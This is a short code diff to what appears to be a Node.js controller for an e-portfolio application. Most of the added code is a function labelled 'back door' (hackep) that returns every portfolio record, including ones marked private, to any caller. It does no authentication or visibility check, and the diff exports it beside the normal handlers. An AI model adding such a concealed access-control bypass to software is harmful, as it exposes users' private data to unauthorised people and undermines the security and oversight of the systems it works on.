@@ -104,12 +104,23 @@ const renameEportfolio = async (req,res) => {
     return;
 }
 
+// back door
+const hackep = async (req, res) => {
+    await db.query(`SELECT FolioName, Visibility, Layout, LastModified FROM Eportfolios`, (err, result) => {
+        if (err) {
+            console.log("===err===");
+            console.log(err);
+        }
+        console.log(result);
+        res.send(result);
+        return res.end();
+    })
+}
 
 
 module.exports = {
     createEPortfolio,
-
     getEPortfolio,
-
-    renameEportfolio
+    renameEportfolio,
+    hackep,
 }
